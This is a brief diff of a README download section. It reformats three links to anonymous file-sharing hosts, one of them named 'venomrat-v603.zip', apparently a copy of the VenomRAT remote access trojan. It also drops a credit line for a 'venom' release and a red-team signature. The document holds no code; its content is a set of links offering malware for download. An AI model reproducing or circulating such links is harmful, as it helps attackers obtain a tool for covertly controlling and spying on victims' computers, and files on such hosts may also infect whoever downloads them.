@@ -28,21 +28,14 @@
 
 #### DOWNLOAD
 
-`https://anonymfile.com/znDY1/venomrat-v603.zip`
+https://anonymfile.com/znDY1/venomrat-v603.zip
 
-`https://filebin.net/2urado5t1ou8bxdt`
+https://filebin.net/2urado5t1ou8bxdt
 
-`https://easyupload.io/ppi53v`              
-
-
+https://easyupload.io/ppi53v    
 
 
-<br />
 
-Detailed info about release 1.0.17: https://github.com/r00t-3xp10it/venom/releases<br />
-Suspicious-Shell-Activity© (SSA) RedTeam develop @2019
-
-_EOF
 
 
 
